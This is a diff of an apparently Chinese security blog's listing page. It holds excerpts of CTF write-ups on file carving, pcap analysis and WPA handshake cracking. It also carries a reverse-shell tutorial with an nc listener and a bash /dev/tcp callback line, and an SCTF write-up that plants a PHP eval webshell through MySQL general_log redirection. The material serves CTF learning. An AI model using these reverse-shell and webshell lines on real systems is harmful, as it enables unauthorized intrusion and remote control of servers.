-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost 2.jpg</span><br></pre></td></tr></table></figure>
-
-<p>分离了两张图片传回到win下查看flag</p>
+<pre><code>binwalk -e 2.jpg</code></pre><p>发现有好多文件，用Kali下的foremost分离一下：</p>
+<pre><code>foremost 2.jpg</code></pre><p>分离了两张图片传回到win下查看flag</p>
 <h3 id="linux基础"><a href="#linux基础" class="headerlink" title="linux基础"></a>linux基础</h3><p>给了一个flag未知类型的文件，又提示linux基础。<br>学会了一个linux下的打印命令：strings</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings flag</span><br></pre></td></tr></table></figure>
-
-<h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>得到一个pcap的文件，果断丢到wireshark<br>追踪Tcp数据流发现有Base64编码的东西。<br>解码后发现有这个东西:C:\wwwroot\flag.tar.gz<br>我的想法是，可能这个pcap里还包含的有其它文件，不管了丢到binwalk里看一下<br><img src="https://s1.ax1x.com/2018/06/23/PpvTz9.png" alt="1"><br>果然有一个zip的压缩文件，但是我用foremost分离不出来，于是用binwalk的dd命令来提取：<br><img src="https://s1.ax1x.com/2018/06/23/Ppvbs1.png" alt="2"></p>
+<pre><code>strings flag</code></pre><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>得到一个pcap的文件，果断丢到wireshark<br>追踪Tcp数据流发现有Base64编码的东西。<br>解码后发现有这个东西:C:\wwwroot\flag.tar.gz<br>我的想法是，可能这个pcap里还包含的有其它文件，不管了丢到binwalk里看一下<br><img src="https://s1.ax1x.com/2018/06/23/PpvTz9.png" alt="1"><br>果然有一个zip的压缩文件，但是我用foremost分离不出来，于是用binwalk的dd命令来提取：<br><img src="https://s1.ax1x.com/2018/06/23/Ppvbs1.png" alt="2"></p>
 <p>注意偏移量的选取！</p>
 <p>参考：<a href="https://blog.csdn.net/vspiders/article/details/72876889" target="_blank" rel="noopener">CTF中图片隐藏文件分离方法总结</a></p>
 <h3 id="要蹭网先解开密码"><a href="#要蹭网先解开密码" class="headerlink" title="要蹭网先解开密码"></a>要蹭网先解开密码</h3><p>给了一个cap文件，放到kali里的aircrack里跑。<br>给了前七位，用密码工具生成完整的11位手机号码的密码字典。<br>接着执行如下命令：<br><img src="https://s1.ax1x.com/2018/06/23/P9kq9P.png" alt="1"><br>index那行提示是让我们看握手包的次数，显示的是三次就输入3</p>
@@ -868,7 +823,7 @@
             </div>
             <div class="continue">
             <a href="/2018/06/23/CTF中的Misc题目/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -904,12 +859,9 @@
 <h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p><img src="https://p3.ssl.qhimg.com/t019632a21686694291.png" alt="1"><br>目标主机为一个内网主机，并没有公网IP地址，我们无法从外网发起对目标主机的远程连接，此时我们使用的方法是使用获取的webshell主动发起一个反弹的shell到外网，然后获取一个目标主机的shell终端控制环境，而有关shell反弹的方法有很多这里简单介绍几种比较常见的方法。</p>
 <h3 id="bash-直接反弹"><a href="#bash-直接反弹" class="headerlink" title="bash 直接反弹"></a>bash 直接反弹</h3><ol>
 <li><p>主机执行监听命令:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 8080 -vvv</span><br></pre></td></tr></table></figure>
-</li>
+<pre><code>nc -l -p 8080 -vvv</code></pre></li>
 <li><p>靶机执行bash反弹命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root# bash -i &gt;&amp; /dev/tcp/XXXXXX(开放监听的ip)/8000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-</li>
+<pre><code>root# bash -i &gt;&amp; /dev/tcp/XXXXXX(开放监听的ip)/8000 0&gt;&amp;1</code></pre></li>
 </ol>
 <p><img src="https://s1.ax1x.com/2018/06/21/PSG5GD.jpg" alt="kaiqi"><br><img src="https://s1.ax1x.com/2018/06/21/PSGIRe.png" alt="xiaoguo"></p>
 <ol start="3">
@@ -923,7 +875,7 @@
             </div>
             <div class="continue">
             <a href="/2018/06/21/Nc反弹Shell初识/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -959,9 +911,7 @@
 <ol>
 <li>百度到一种绕过file_priv写shell的方法： <a href="https://www.cnblogs.com/xishaonian/p/6622818.html" target="_blank" rel="noopener">phpmyadmin通过日志文件拿到webshell</a></li>
 <li>接下来我们要找路径，我们可以通过找Log变量猜测绝对路径：<br><img src="https://s1.ax1x.com/2018/06/20/CzxNJH.png" alt="tupian"></li>
-<li>有一点需要注意我们写小马的时候[]中尽量用双引号，否则会有转义的麻烦，我这次写的一句话是这样的：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&quot;hpdoger&quot;]); ?&gt;</span><br></pre></td></tr></table></figure>
-
-</li>
+<li>有一点需要注意我们写小马的时候[]中尽量用双引号，否则会有转义的麻烦，我这次写的一句话是这样的：<pre><code>&lt;?php eval($_POST[&quot;hpdoger&quot;]); ?&gt;</code></pre></li>
 </ol>
 <h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>set global general_log=’on’;<br>set global general_log_file=’G:/apm/apache2/htdocs/config.php’;</p>
 <p>这个log的路径自己发挥，想办法找可写路径。可以看一下log变量原来有没有路径</p>
@@ -972,7 +922,7 @@
             </div>
             <div class="continue">
             <a href="/2018/06/20/一道SCTF写日志getshell/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -980,7 +930,7 @@
 </section>
 
   <nav class="page-nav">
-    <a class="extend prev" rel="prev" href="/page/3/">&laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/">下一页 &raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
   </nav>
 
     </main>
